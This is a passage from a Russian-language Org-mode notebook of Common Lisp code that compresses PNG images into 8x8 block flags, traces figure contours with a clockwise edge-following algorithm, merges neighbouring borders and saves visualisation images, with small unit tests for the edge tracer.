Чтобы алгоритм был cache-friendly мы проходим массив пикселей строка за строкой обновляя массивы ~packflag~ и ~packline~. Каждый элемент массива ~packflag~ содержит 0 если цвет не менялся. Если же цвет менялся - то этот элемент содержит число от 1 до 64, которое представляет собой относительный порядковый номер пикселя в квадрате 8*8, где было обнаружено изменение цвета. Элементы массива ~packline~, содержащат цвет всего квадрата 8*8, если цвет не менялся или цвет тех первых точек квадрата до изменения цвета, если считать от левого верхнего угла квадрата.

#+NAME: conv_8x8
#+BEGIN_SRC lisp
  (ql:quickload "png")

  (defmacro pin (yy xx aa bb cc)
    `(progn
       (setf (aref new ,yy ,xx 0) ,aa)
       (setf (aref new ,yy ,xx 1) ,bb)
       (setf (aref new ,yy ,xx 2) ,cc)))

  (declaim (inline copy-png))

  (declaim (ftype (function (string string) fixnum)
                  copy-png))

  (setf *features*
        (remove :packrest *features*))

  ;; (pushnew :packrest *features*)


  (defun conv-8x8 (img)
    (declare (optimize (speed 3))
             (optimize (safety 0)))
    (let* ((width      (the fixnum (logand -8 (png:image-width img))))
           (height     (the fixnum (logand -8 (png:image-height img))))
           (channels   (the fixnum (png:image-channels img)))
           (bit-depth  (the fixnum (png:image-bit-depth img)))
           (packflag   (make-array `(,(ash height -3) ,(ash width -3))
                                   :element-type 'fixnum))
           (packline   (make-array `(,(ash height -3) ,(ash width -3) ,channels)
                                   :element-type '(unsigned-byte 8))))
      ;; packflag - это массив флагов равных нулю, когда в квадрате 8*8 есть только один цвет
      ;; packline - это массив этих цветов в обрабатываемой строке пикселей
      (declare  (type fixnum width)     (type fixnum height)
                (type fixnum channels)  (type fixnum bit-depth))
      (do* ((yy1      0  (+ 1 yy1))
            (yy-8-p   0  (logand yy1 7)) ;; true когда y-координата кратна 8
            (yy3      0  (ash yy1 -3)))  ;; y-индекс в массиве packflag
           ((>= yy1 height))
        (declare (type fixnum yy1) (type fixnum yy-8-p) (type fixnum yy3))
        (do* ((xx1      0  (+ 1 xx1))
              (xx-8-p   0  (logand xx1 7)) ;; true когда x-координата кратна 8
              (xx3      0  (ash xx1 -3)))  ;; x-индекс в массиве packflag
             ((>= xx1 width))
          (declare (type fixnum xx1) (type fixnum xx-8-p) (type fixnum xx3))
          (block internal-loop
            (if (= 0 xx-8-p yy-8-p)
                (progn ;; then - левый верхний угол квадрата 8x8
                  ;; (pin yy1 xx1 0 255 0) ;; ~~~~~~~ GREEN
                  (setf (aref packflag yy3 xx3) 0) ;; set packflag = 0
                  (dotimes (zz channels)           ;; save to packline
                    (setf (aref packline yy3 xx3 zz)
                          (aref img yy1 xx1 zz))))
                (progn ;; else - любая другая точка кроме верхнего левого угла
                  ;; (pin yy1 xx1 0 70 0)  ;; ~~~~~~~ DARK-GREEN
                  ;; (dotimes (zz channels) ;;~~~~~~~~~~~~~~[:::::::::::::]~~~~~
                  ;;   (setf (aref new yy1 xx1 zz)
                  ;;         (aref img yy1 xx1 zz)))
                  (if (not (= 0 (aref packflag yy3 xx3)))
                      ;; цвет в этом квадрате 8*8 уже менялся -
                      ;; нет смысла проверять опять
                      (progn
                        ;; (pin yy1 xx1 0 0 70)  ;; ~~~~~~~ DARK-BLUE
                        )
                      ;; else - цвет ранее не менялся - имеет смысл проверить сейчас
                      ;; отличается ли цвет текущего обрабатываемого пикселя от эталона
                      (progn
                        (dotimes (zz channels)
                          (if (= (aref packline yy3 xx3 zz)
                                 (aref img yy1 xx1 zz))
                              (progn ;; в
                                ;; (pin yy1 xx1 70 0 0)  ;; ~~~~~~~ DARK-RED
                                )
                              ;; else - любой канал не равен -> весь квадрат к черту
                              (progn
                                ;; (pin yy1 xx1 157 157 0) ;; ~~~~~~~ DARK-YELLOW
                                (setf (aref packflag yy3 xx3)
                                      (+ (ash (logand yy1 7) 3) ;; [bits:00yyyxxx]
                                         (logand xx1 7))))))
                        ;; Если мы здесь, то цвет не поменялся после проверки текущего
                        ;; пикселя - тут мы пока не делаем ничего
                        (progn nil)
                        ))))) ;; end of internal-loop
          ) ;; end of do-cycle for x
        )  ;; end of do-cycle for y
      (values
       packflag packline height width channels bit-depth)))
#+END_SRC




#+NAME: re_conv_8x8
#+BEGIN_SRC lisp
  (defmacro light-packline-color ()
    `(logior #b10000000
             (aref packline yy3 xx3 zz)))

  (defmacro rgb-times (&body body)
    `(dotimes (zz channels)
       (setf (aref new yy1 xx1 zz)
             ,@body)))

  ;; (macroexpand-1 '(rgb-times (light-packline-color)))


  (defun re-conv-8x8 (packflag packline height width channels bit-depth &optional old)
    (declare (optimize (speed 3))
             (optimize (safety 0)))
    (let* ((new        (png:make-image height width channels bit-depth)))
      ;; Восстанавливаем информацию из packflag и packline
      (do* ((yy1      0  (+ 1 yy1))
            (yy-8-p   0  (logand yy1 7))
            (yy3      0  (ash yy1 -3)))
           ((>= yy1 height))
        (declare (type fixnum yy1) (type fixnum yy-8-p) (type fixnum yy3))
        (do* ((xx1      0  (+ 1 xx1))
              (xx-8-p   0  (logand xx1 7))
              (xx3      0  (ash xx1 -3)))
             ((>= xx1 width))
          (declare (type fixnum xx1) (type fixnum xx-8-p) (type fixnum xx3))
          (let* ((packflag (aref packflag yy3 xx3))
                 (bb7 (logand #b10000000 packflag))
                 (bb6 (logand #b01000000 packflag))
                 (b_5 (logand #b00111111 packflag))
                 (yy4 (ash b_5 -3))
                 (xx4 (logand b_5 #b111))
                 (y-chg (+ yy4 (logand yy1 -8)))  ;; Y изменения цвета
                 (x-chg (+ xx4 (logand xx1 -8)))) ;; X изменения цвета
            (if (= 0 b_5)
                ;; 8x8-квадрат залит полностью - выведем его цвет с
                ;; дитерингом осветляя каждый второй пиксель, чтобы
                ;; показать что это фон и получить масштабную сетку
                (rgb-times
                  (if (or (not (= 0 (logand yy1 #b010)))
                          (not (= 0 (logand xx1 #b010))))
                      (aref packline yy3 xx3 zz)
                      ;; else
                      (logand 255 (+ 20 (aref packline yy3 xx3 zz)))))
                ;; else: 8x8-квадрат не залит полностью
                (if (and (< yy1 y-chg)
                         (< xx3 x-chg))
                    ;; заливаем первые пиксели цветом из packline
                    (progn ;; filled part
                      (rgb-times
                        (aref packline yy3 xx3 zz)))
                    ;; else: а остальные
                    ;; пропускаем если у нас нет исходного изображения,
                    ;; иначе берем пиксели из исходника, но обнуляем
                    ;; их младшие биты, чтобы цвет остальных пикселей
                    ;; отличался от того что мы взяли из packline для
                    ;; залитого участка квадрата
                    (when old
                      (rgb-times
                        (logand 255
                                ;; we need only 1 bit for channel
                                (logior #b00011111
                                        (aref old yy1 xx1 zz)))))))
            ;; Особые случаи: Если у нас есть флаги bb7 и bb6
            (when (not (= 0 bb7))
              (rgb-times
                (if (and (= 1 zz)
                         (or (= (logand yy1 #b111) (logand xx1 #b111))
                             (= 0 (logand yy1 #b111))
                             (= 0 (logand xx1 #b111))))
                    255
                    ;; else
                    (aref new yy1 xx1 zz)
                    )))
            (when (not (= 0 bb6))
              (rgb-times
                (if (and (= 2 zz)
                         (or (= (logand yy1 #b111) (logand xx1 #b111))
                             (= 0 (logand yy1 #b111))
                             (= 0 (logand xx1 #b111))))
                    255
                    ;; else
                    (aref new yy1 xx1 zz)
                    ))))))
      new))

  ;; launcher

  (defun save-packflag-for-test (filepath par-packflag par-packline y-size x-size channels bit-depth &optional img)
    (let ((new (re-conv-8x8 par-packflag par-packline y-size x-size channels bit-depth img)))
      (with-open-file (output filepath :element-type '(unsigned-byte 8)
                                       :direction :output :if-exists :supersede)
        (png:encode new output))))


  ;; (let* ((img
  ;;          (with-open-file
  ;;              ;; (input "x-snapshot-true-color-telegram.png" :element-type '(unsigned-byte 8))
  ;;              (input "antalya.png" :element-type '(unsigned-byte 8))
  ;;            (png:decode input))))
  ;;   (multiple-value-bind (packflag packline height width channels bit-depth)
  ;;       (conv-8x8 img)
  ;;     ;; (save-packflag-for-test
  ;;     ;; "copy2.png" packflag packline height width channels bit-depth img)))
  ;;     (let ((new (re-conv-8x8 packflag packline height width channels bit-depth
  ;;                             img
  ;;                             )))
  ;;       (with-open-file
  ;;           (output "copy3.png"
  ;;                   :element-type '(unsigned-byte 8)
  ;;                   :direction :output :if-exists :supersede)
  ;;         (png:encode new output)))
  ;;     ))

#+END_SRC

* Edge detector

Поиск краев:

- Выберем начальный параметр - точку внутри фигуры, края которой мы хотим найти. Ее цвет должен быть равен цвету тона (Fg) и сверху над ней должна быть точка фона (Bg). Запоминаем эту точку - ~EntryPnt~ и ее же записываем в текущую точку - ~CurPnt~.
- Установим начальное направление движения "вправо" (ToRight). В дальнейшем направление движения будет меняться чтобы обходить фигуру по контуру в направлении по часовой стрелке.
- Попытка продвижения вперед:
  - Если слева по направлению движения есть точка с цветом тона (Fg), то мы должны повернуть направление влево и повторить попытку продвижения вперед.
  - Иначе (слева находится точка фона - Bg):
    - Если впереди по направлению движения есть точка с цветом тона (Fg), то мы можем продвинуться вперед. Продвигаясь вперед мы заталкиваем предыдущую точку в ~Stack~ и делаем следующую по направлению движения точку текущей - ~CurPnt~.
      - После этого мы должны проверить, не совпадает ли новая текущая точка ~CurPnt~ с начальной точкой ~EntryPnt~ - если это так, то мы обошли фигуру и дошли до начальной точки и должны вернуть ~Stack~ и выйти. В противном случае мы пытаемся продвинуться на еще одну точку вперед по направлению движения.
    - Иначе (впереди по направлению движения есть точка с цветом фона (Bg). Мы не можем продвинуться вперед, мы должны повернуть направление движения вправо и повторить попытку продвижения вперед.

#+BEGIN_SRC plantuml :file ./img/rc-edge-detector.png
  start
    :set EntryPoint = CurPnt;
    :set: Direction = ToRight;
    !pragma useVerticalIf on
    (A)
    if ((Fg == leftSide(CurPnt))?) then (yes)
      :set: Direction = rotateLeft(Direction);
      (F)
      :push(Stack, CurPnt);
      :set: CurPnt = moveForward(CurPnt);
      if ((curPnt != EntryPoint)?) then (yes)
        (A)
      endif;
    else (no)
      :set: RotateCnt = 0;
      (R)
      repeat
        if ((Fg == forwardSide(CurPnt))?) then (yes)
          (F)
        else (no)
          :set: Direction = rotateRight(Direction);
          :set: RotateCnt++;
        endif;
      repeat while ((RotateCnt < 3)) is (yes goto (R))
    endif;
    :return reverse(Stack);
    stop;
#+END_SRC

Implemenation

#+NAME: edge_8x8
#+BEGIN_SRC lisp
  (defstruct pnt
    (y 0 :type fixnum)
    (x 0 :type fixnum))

  (deftype direction ()
    ;; to-right to-up to-left to-down
    '(member :tr :tu :tl :td))

  (defstruct edge-pnt
    (y 0 :type fixnum)
    (x 0 :type fixnum)
    (d :tr :type direction))

  (defmethod print-object ((obj edge-pnt) stream)
    (format stream "#S(EDGE-PNT :Y ~A :X ~A :D :~A)"
            (edge-pnt-y obj)
            (edge-pnt-x obj)
            (edge-pnt-d obj)))

  (defun rotate-left (direction)
    (cond ((equal :tr direction) :tu)
          ((equal :tu direction) :tl)
          ((equal :tl direction) :td)
          ((equal :td direction) :tr)))

  (defun rotate-right (direction)
    (cond ((equal :tr direction) :td)
          ((equal :tu direction) :tr)
          ((equal :tl direction) :tu)
          ((equal :td direction) :tl)))

  ;; Y-координата идет в CUR-PNT первой
  ;; -1 means to low
  ;; -2 means to high
  ;; TODO:inilne
  (defun forward-side (cur-pnt direction height width)
    (let ((yy (pnt-y cur-pnt))
          (xx (pnt-x cur-pnt)))
      (destructuring-bind (yyy . xxx)
          (ecase direction
            (:tr (cons yy (+ xx 1)))
            (:tu (cons (- yy 1) xx))
            (:tl (cons yy (- xx 1)))
            (:td (cons (+ yy 1) xx)))
        (when (< yyy 0)       (setf yyy -1))
        (when (< xxx 0)       (setf xxx -1))
        (when (> yyy height)  (setf yyy -2))
        (when (> xxx width)   (setf xxx -2))
        (make-pnt :y yyy :x xxx))))

  ;; (forward-side-pnt-coords (cons 202 3) :td 200 300)

  (defun fg-p (cur-pnt packflag height width)
    (let ((yy (pnt-y cur-pnt))
          (xx (pnt-x cur-pnt)))
      (and (>= yy 0)
           (>= xx 0)
           (< yy height)
           (< xx width)
           (not (= 0 (aref packflag yy xx))))))

  (defun left-side (cur-pnt direction height width)
    (forward-side cur-pnt (rotate-left direction) height width))


  (defun edge-8x8 (cur-pnt height width packflag)
    ;; packflag not mutable in this functuin
    (let ((entry-point cur-pnt)        ;; сохраняем начальную точку
          (stack '())                  ;; создаем пустой стек
          (direction :tr))       ;; задаем начальное направление
      (labels ((f ()
                 (let ((out-edge-pnt
                         (make-edge-pnt
                          :y (pnt-y cur-pnt)
                          :x (pnt-x cur-pnt)
                          :d direction)))
                   (push out-edge-pnt stack))
                 (setf cur-pnt (forward-side cur-pnt direction height width))
                 (not (equalp cur-pnt entry-point))))
        ;; (format t "direction: ~A ~%" direction)
        (tagbody
         lab_A
           ;; (read-line)
           ;; (format t ":: cur-pnt: ~A ~%" cur-pnt)
           (let* ((left-crd (left-side cur-pnt direction height width))
                  (left-val (fg-p left-crd packflag height width)))
             ;; (format t "left: ~A : ~A ~%" left-crd left-val)
             (if left-val
                 (progn ;; then fg == left-val
                   ;; (format t ":: left fg detected => rotate-left ~%")
                   (setf direction (rotate-left direction))
                   ;; (format t "direction: ~A ~%" direction)
                   (when (f)
                     (go lab_A)))
                 (progn ;; else bg == left-val
                   (let ((rotate-cnt 0))
                     (tagbody
                      lab_R
                        ;; (format t "rotate-cnt: ~A ~%" rotate-cnt)
                        (let* ((forward-crd (forward-side cur-pnt direction height width))
                               (forward-val (fg-p forward-crd packflag height width)))
                          ;; (format t "forward: ~A : ~A ~%" forward-crd forward-val)
                          (if forward-val
                              (when (f)
                                (go lab_A))
                              (progn ;; else
                                ;; (format t "=>: rotate-right ~%")
                                (setf direction (rotate-right direction))
                                ;; (format t "direction: ~A ~%" direction)
                                (incf rotate-cnt)
                                (when (< rotate-cnt 3)
                                  (go lab_R)))))))))
             (progn
               ;; (format t ":: finish: ~A ~%"
                       ;; (if (equal cur-pnt entry-point)
                           ;; "entry-point achived"
                           ;; "over rotation"))
               (return-from edge-8x8 (reverse stack))))))))

  ;; Tests

  (defun simple-test ()
    (let* ((packflag #2A((0 0 0 0 )
                         (0 1 1 0 )
                         (0 1 1 0 )
                         (0 0 0 0 )))
           (start-point (make-pnt :y 1 :x 1))
           (height 10)
           (width 10)
           (expected-result
             (list #S(EDGE-PNT :Y 1 :X 1 :D :TR)
                   #S(EDGE-PNT :Y 1 :X 2 :D :TD)
                   #S(EDGE-PNT :Y 2 :X 2 :D :TL)
                   #S(EDGE-PNT :Y 2 :X 1 :D :TU)))
           (result (edge-8x8 start-point height width packflag)))
      (if (equalp result expected-result)
          (progn
            (format t ":: Test passed.")
            t)
          (progn
            (format t "::= Test failed. Expected:~%~A~%, but got:~%~A"
                    expected-result result)
          nil))))

  ;; (simple-test)

  (defun complex-test ()
    (let* ((packflag #2A((0 0 0 0 0 0 0)
                         (0 1 0 1 1 1 0)
                         (0 1 1 1 0 1 0)
                         (0 0 1 0 0 1 0)
                         (0 0 1 0 1 1 0)
                         (0 0 1 1 1 0 0)
                         (0 0 0 1 1 0 0)
                         (0 0 0 0 0 0 0)))
           (start-point (make-pnt :y 1 :x 1))
           (height 10)
           (width 10)
           (expected-result
             (list
              #S(EDGE-PNT :Y 1 :X 1 :D :TD) #S(EDGE-PNT :Y 2 :X 1 :D :TR)
              #S(EDGE-PNT :Y 2 :X 2 :D :TR) #S(EDGE-PNT :Y 2 :X 3 :D :TU)
              #S(EDGE-PNT :Y 1 :X 3 :D :TR) #S(EDGE-PNT :Y 1 :X 4 :D :TR)
              #S(EDGE-PNT :Y 1 :X 5 :D :TD) #S(EDGE-PNT :Y 2 :X 5 :D :TD)
              #S(EDGE-PNT :Y 3 :X 5 :D :TD) #S(EDGE-PNT :Y 4 :X 5 :D :TL)
              #S(EDGE-PNT :Y 4 :X 4 :D :TD) #S(EDGE-PNT :Y 5 :X 4 :D :TD)
              #S(EDGE-PNT :Y 6 :X 4 :D :TL) #S(EDGE-PNT :Y 6 :X 3 :D :TU)
              #S(EDGE-PNT :Y 5 :X 3 :D :TL) #S(EDGE-PNT :Y 5 :X 2 :D :TU)
              #S(EDGE-PNT :Y 4 :X 2 :D :TU) #S(EDGE-PNT :Y 3 :X 2 :D :TU)
              #S(EDGE-PNT :Y 2 :X 2 :D :TL) #S(EDGE-PNT :Y 2 :X 1 :D :TU)))
           (result (edge-8x8 start-point height width packflag)))
      (if (equalp result expected-result)
          (progn
            (format t ":: Test passed.")
            t)
          (progn
            (format t "::= Test failed. Expected:~%~A~%, but got:~%~A"
                    expected-result result)
          nil))))

  ;; (complex-test)

  (defun border-test ()
    (let* ((packflag #2A((1 1 1 0)
                         (0 1 1 1)
                         (1 1 1 1)
                         (1 1 1 0)
                         (0 1 1 0)))
           (start-point (make-pnt :y 0 :x 0))
           (height 5)
           (width 4)
           (expected-result
             (list
              #S(EDGE-PNT :Y 0 :X 0 :D :TR) #S(EDGE-PNT :Y 0 :X 1 :D :TR)
              #S(EDGE-PNT :Y 0 :X 2 :D :TD) #S(EDGE-PNT :Y 1 :X 2 :D :TR)
              #S(EDGE-PNT :Y 1 :X 3 :D :TD) #S(EDGE-PNT :Y 2 :X 3 :D :TL)
              #S(EDGE-PNT :Y 2 :X 2 :D :TD) #S(EDGE-PNT :Y 3 :X 2 :D :TD)
              #S(EDGE-PNT :Y 4 :X 2 :D :TL) #S(EDGE-PNT :Y 4 :X 1 :D :TU)
              #S(EDGE-PNT :Y 3 :X 1 :D :TL) #S(EDGE-PNT :Y 3 :X 0 :D :TU)
              #S(EDGE-PNT :Y 2 :X 0 :D :TR) #S(EDGE-PNT :Y 2 :X 1 :D :TU)
              #S(EDGE-PNT :Y 1 :X 1 :D :TU) #S(EDGE-PNT :Y 0 :X 1 :D :TL)))
           (result (edge-8x8 start-point height width packflag)))
      (if (equalp result expected-result)
          (progn
            (format t ":: Test passed.")
            t)
          (progn
            (format t "::= Test failed. Expected:~%~A~%, but got:~%~A"
                    expected-result result)
            nil))))

  ;; (border-test)
#+END_SRC

* Edges searching for figures

Чтобы найти все потенциальные точки, откуда может начинаться замкнутая фигура мы идем вниз по вертикальной оси и ищем переход с пустой 8x8 точки в ~packflag~ на непустую. Каждая такая непустая точка, выше который находится пустая - это потенциальный кандидат на начало фигуры.

Найдя потенциальные точки мы можем в цикле использовать их для поиска фигур функцией ~edge-8x8~. При этом мы каждый раз будем получать набор точек по краю фигуры. Если точки из этого набора присутствуют в списке потенциальных точек, то их нужно оттуда удалить, так как точки ограничивающие одну фигуру не могут быть частью другой.

#+NAME: launcher
#+BEGIN_SRC lisp
  (defmacro dbgout-array (name)
    (let ((format-str (concatenate 'string "~%~%len " (symbol-name name) " : ~A")))
      `(progn
         (format t ,format-str (length ,name))
         (print ,name)
         (format t "~%"))))

  ;; (macroexpand-1 '(dbgout-array rest-of-candidates))


  ;; (defmacro plot-points (packflag list-of-points mask)
  ;;   `(loop for (yy . xx) in ,list-of-points do
  ;;     (setf (aref ,packflag yy xx)
  ;;           (logior ,mask
  ;;                   (aref ,packflag yy xx)))))

  ;; (macroexpand-1 '(plot-points packflag cur-edge #b01000000))


  (defun save-packflag (filepath par-packflag par-packline y-size x-size channels bit-depth &optional img)
    (let ((new (re-conv-8x8 par-packflag par-packline y-size x-size channels bit-depth img)))
      (with-open-file (output filepath :element-type '(unsigned-byte 8)
                                       :direction :output :if-exists :supersede)
        (png:encode new output))))

  (defun find-edges (packflag height width)
    (let ((pf-height (ash height -3))
          (pf-width  (ash width  -3))
          (edges))
      (labels ((find-candidates-8x8 (packflag height width)
                 ;; Поиск затравок сверху вниз. Затравка - это точка с
                 ;; цветом тона (1) которая находится ниже точки с цветом
                 ;; фона (0)"
                 (let ((ret-candidates))
                   (do* ((xx 0  (+ 1 xx)))
                        ((>= xx width))
                     (let ((prev 0))
                       (do* ((yy 0  (+ 1 yy)))
                            ((>= yy height))
                         (let ((flag (aref packflag yy xx)))
                           (if (= 0 flag)
                               (setf prev 0)    ;; then
                               (when (= 0 prev) ;; else
                                 (let ((cand(make-pnt :y yy :x xx)))
                                 (push cand ret-candidates)
                                   (setf prev flag))))))))
                   (reverse ret-candidates)))
               (remove-from-candidates (list-of-points rest-of-candidates)
                 (loop for edge-pnt in list-of-points do
                   (setf rest-of-candidates ;; delete really faster them remove
                         (delete-if #'(lambda (cand-pnt)
                                        (and
                                         (equalp (edge-pnt-y edge-pnt)
                                                 (pnt-y cand-pnt))
                                         (equalp (edge-pnt-x edge-pnt)
                                                 (pnt-x cand-pnt))))
                                    rest-of-candidates)))
                 rest-of-candidates)
               (rec-elim (candidates)
                 ;; Поиск краев фигуры, начиная от затравки с последующим
                 ;; удалением всех точек краев из остатка списка кандидатов
                 ;; пока список кандидатов не закончится
                 (if (null candidates)
                     (values)
                     ;; else
                     (let* ((candidate (car candidates))
                            (rest-of-candidates (cdr candidates))
                            (cur-edge (edge-8x8 candidate pf-height pf-width packflag)))
                       (push cur-edge edges)
                       ;; Удаляем из списка кандидатов все точки обнаруженного
                       ;; края фигуры (cur-edge). Так как по определению края ищутся
                       ;; начиная с каждой точки-кандидата было бы избыточно удалять
                       ;; из кандидатов все точки заливки (cur-full)
                       (setf rest-of-candidates
                             (remove-from-candidates cur-edge rest-of-candidates))
                       ;; (print (length rest-of-candidates))
                       ;; Хвостовая рекурсия
                       (rec-elim rest-of-candidates)))))
        (declare (inline find-candidates-8x8) (inline rec-elim))
        ;; Итерируемся по точкам-кандидатам, ища края и удаляя из
        ;; оставшихся кандидатов тех, что совпадают с найденными краями
        ;; пока кандидатов не останется. На выходе - edges
        (rec-elim (find-candidates-8x8 packflag pf-height pf-width))
        (reverse edges))))


  (defun edge-visualization (edges new height width)
    (labels ((fence (it max)
               (when (< it  0)
                 (setf it 0))
               (when (> it (- max 1))
                 (setf it (- max 1)))
               it)
             (plot (yy xx rr gg bb)
               (setf (aref new (fence yy height) (fence xx width) 0) rr)
               (setf (aref new (fence yy height) (fence xx width) 1) gg)
               (setf (aref new (fence yy height) (fence xx width) 2) bb)))
      (loop for edge in edges do
        (loop for edge-pnt in edge do
          (loop for off from 0 to 7 do
            (let ((yy (ash (edge-pnt-y edge-pnt) 3))
                  (xx (ash (edge-pnt-x edge-pnt) 3)))
              (ecase (edge-pnt-d edge-pnt)
                (:tr (progn
                       (loop for off from 0 to 7 do
                         (plot yy (+ xx off) 255 0 0))
                       (loop for off from 1 to 3 do
                         (plot (+ yy off) (- (+ xx 7) off) 255 0 0))))
                (:tl (progn
                       (loop for off from 0 to 7 do
                         (plot (+ yy 7) (+ xx off) 0 0 255))
                       (loop for off from 4 to 6 do
                         (plot (+ yy off) (- (+ xx 7) off) 0 0 255))))
                (:tu (progn
                       (loop for off from 0 to 7 do
                         (plot (+ yy off) xx 0 255 0))
                       (loop for off from 1 to 3 do
                         (plot (+ yy off) (+ xx off) 0 255 0))))
                (:td (progn
                       (loop for off from 0 to 7 do
                         (plot (+ yy off) (+ xx 7) 0 255 255))
                       (loop for off from 4 to 6 do
                         (plot (+ yy off) (+ xx off) 0 255 255))))))))))
    new)


  (defun get-xy-pair (edge-pnt)
    (cons (edge-pnt-y edge-pnt)
          (edge-pnt-x edge-pnt)))


  (defun get-edge-ht-keys (edge)
    (sort (remove-duplicates
           (mapcar #'get-xy-pair edge))
          #'(lambda (a b)
              (if (= (car a) (car b))
                  (> (cdr a) (cdr b))
                  (= (car a) (car b))))))


  (defun zero-frame-factor-p (edge)
    (let ((ht (make-hash-table :test #'equalp)))
      (loop for edge-pnt in edge :do
        (let ((key (get-xy-pair edge-pnt)))
          (multiple-value-bind (value present)
              (gethash key ht)
            (if present
                (setf (gethash key ht)
                      (push (edge-pnt-d edge-pnt) value))
                ;; else
                (setf (gethash key ht)
                      (list (edge-pnt-d edge-pnt)))))))
      (let ((single 0)  (multi  0))
        (loop for key being the hash-keys of ht using (hash-value val) do
          (if (= 1 (length val))
              (incf single)
              (incf multi)))
        (= 0 (floor multi single)))))


  ;; launcher

  (defun edge-mrg (r-idx l-idx)
    (format t "~%  ~A <==> ~A ~%" r-idx l-idx))

  (defun edge-match (r-edge l-edge r-idx l-idx)

    nil)

  (defun launcher (filename)
    (let ((img (with-open-file (input filename :element-type '(unsigned-byte 8))
                 (png:decode input)))
          (dir (ensure-directories-exist (format nil "./~A/"  (symbol-name (gensym))))))
      (multiple-value-bind (packflag packline height width channels bit-depth)
          (conv-8x8 img)
        (let* ((edges ;; Находим все границы фигур и удаляем найденные рамки из них
                 (remove-if-not #'zero-frame-factor-p
                                (find-edges packflag height width)))
               (l-edges ;; Для каждой каймы здесь оставляем только левый край
                 (mapcar #'(lambda (edge) ;; - это точки с направленем вверх
                             (remove-if-not #'(lambda (edge-pnt)
                                                (equal :tu (edge-pnt-d edge-pnt)))
                                            edge))
                         edges))
               (r-edges ;; Для каждой каймы здесь оставляем только правый край
                 (mapcar #'(lambda (edge) ;;  - это точки с направлением вниз
                             (remove-if-not #'(lambda (edge-pnt)
                                                (equal :td (edge-pnt-d edge-pnt)))
                                            edge))
                         edges))
               (junctions))
          ;; Для каждого из левых краев получаем край справа (от левого блока)
          (loop for r-edge in l-edges for r-idx from 0 do
            ;; Для каждого из правых краев получаем край слева (от правого блока)
            (loop for l-edge in r-edges for l-idx from 0 do
              ;; Если удалось сопоставить точки которые лежат на одной горизонтали
              (when (block edge-match
                      ;; (а для этого мы сопоставляем поточечно, и если находим
                      ;; хотя бы одну пару соответстующих точек справа и слева
                      ;; между которыми лежит одна точка фона,
                      ;; то считаем что края совпали и дальше не проверяем
                      (loop for r-edge-pnt :in r-edge for r-idx-pnt from 0 do
                        (loop for l-edge-pnt :in l-edge for l-idx-pnt from 0 do
                          (when (and (= (edge-pnt-y r-edge-pnt) (edge-pnt-y l-edge-pnt))
                                     (= (edge-pnt-x r-edge-pnt) (+ (edge-pnt-x l-edge-pnt) 2)))
                            ;; Итак мы обнаружили две каймы, которым мешает объединится только
                            ;; то что между ними есть квадрат цвета фона. Мы можем запомнить
                            ;; их индексы, и координату разделяющей точки, чтобы выполнить
                            ;; обьединение за пределами цикла
                            (push (list l-idx r-idx (length l-edge) (length r-edge)
                                        (make-pnt :y (edge-pnt-y r-edge-pnt)
                                                  :x (+ (edge-pnt-x l-edge-pnt) 1)))
                                  junctions)
                            ;; Тут позже закомментим
                            ;; (setf (aref packflag
                            ;;             (edge-pnt-y r-edge-pnt)
                            ;;             (edge-pnt-x r-edge-pnt))
                            ;;       0)
                            ;; (setf (aref packline
                            ;;             (edge-pnt-y r-edge-pnt)
                            ;;             (edge-pnt-x r-edge-pnt)
                            ;;             0)
                            ;;       255)
                            ;; (setf (aref packflag
                            ;;             (edge-pnt-y r-edge-pnt)
                            ;;             (edge-pnt-x l-edge-pnt))
                            ;;       0)
                            ;; (setf (aref packline
                            ;;             (edge-pnt-y r-edge-pnt)
                            ;;             (edge-pnt-x l-edge-pnt)
                            ;;             1)
                            ;;       255)
                            (return-from edge-match t))))
                      ;; Здесь мы оказываемся, если для этих edges ничего не нашли
                      ;; Тогда ищем дальше, для следующих точек в цикле
                      nil)
                (format t "~%  ~A <==> ~A | ~A >--< ~A ~%"
                        r-idx l-idx (length r-edge) (length l-edge)))))
          ;; Итак у нас есть junctions
          ;; Осталось слить Edges по их номерам, а потом выполнить заливку
          (loop for jun in junctions :do
            (destructuring-bind (l-idx r-idx r-len l-len jp)
                jun
              (format t "~%  ~A <==> ~A | ~A >--< ~A ~%"
                      r-idx l-idx l-len r-len)
              (setf (aref packflag (pnt-y jp) (- (pnt-x jp) 1)) 63)
              (setf (aref packline (pnt-y jp) (- (pnt-x jp) 1) 0) 255)
              (setf (aref packline (pnt-y jp) (- (pnt-x jp) 1) 1) 255)
              (setf (aref packline (pnt-y jp) (- (pnt-x jp) 1) 2) 0)
              ;;
              (setf (aref packflag (pnt-y jp) (pnt-x jp)) 63)
              (setf (aref packline (pnt-y jp) (pnt-x jp) 0) 0)
              (setf (aref packline (pnt-y jp) (pnt-x jp) 1) 255)
              (setf (aref packline (pnt-y jp) (pnt-x jp) 2) 255)
              ;;
              (setf (aref packflag (pnt-y jp) (+ (pnt-x jp) 1)) 63)
              (setf (aref packline (pnt-y jp) (+ (pnt-x jp) 1) 0) 255)
              (setf (aref packline (pnt-y jp) (+ (pnt-x jp) 1) 1) 0)
              (setf (aref packline (pnt-y jp) (+ (pnt-x jp) 1) 2) 255)
              ))
          (loop for edge in edges do
            (let ((new (re-conv-8x8 packflag packline height width channels bit-depth img)))
              (setf new (edge-visualization (list edge) new height width))
              ;; save
              (with-open-file (output
                               (format nil "~A/~A+.png" dir (symbol-name (gensym)))
                               :element-type '(unsigned-byte 8)
                               :direction :output :if-exists :supersede)
                (png:encode new output))))
          ;; (save-packflag (format nil "~A/~A+.png" dir (symbol-name (gensym)))
          ;;                packflag packline height width
          ;;                channels bit-depth img)
          ))))

  (time
   (launcher "antalya.png"))


  ;; (defun core-main ()
  ;;   (time
  ;;    (progn
  ;;      (x-snapshot :path "snapshot.png")
  ;;      (launcher "snapshot.png"))))


  ;; (maximin (loop for cur-edge in edges
  ;;                collect (list
  ;;                         (reduce #'(lambda (max-pair pair)
  ;;                                     (if (> (cdr pair) (cdr max-pair))
  ;;                                         pair
  ;;                                         max-pair))
  ;;                                 cur-edge)
  ;;                         (reduce #'(lambda (min-pair pair)
  ;;                                     (if (< (cdr pair) (cdr min-pair))
  ;;                                         pair
  ;;                                         min-pair))
  ;;                                 cur-edge))))


  ;; (print maximin)
  ;; ;; maximin - это список. Каждый элемент этого списка - это
  ;; ;; список из 2-х элементов, первый из которых - это
  ;; ;; кордината самого правого края фигуры, а второй - это
  ;; ;; координата самого левого края фигуры
  ;; (loop for (cur-right-pair cur-left-pair) in maximin do
  ;;   (plot-points packflag (list cur-right-pair)  #b10000000)
  ;;   (plot-points packflag (list cur-left-pair)   #b01000000)
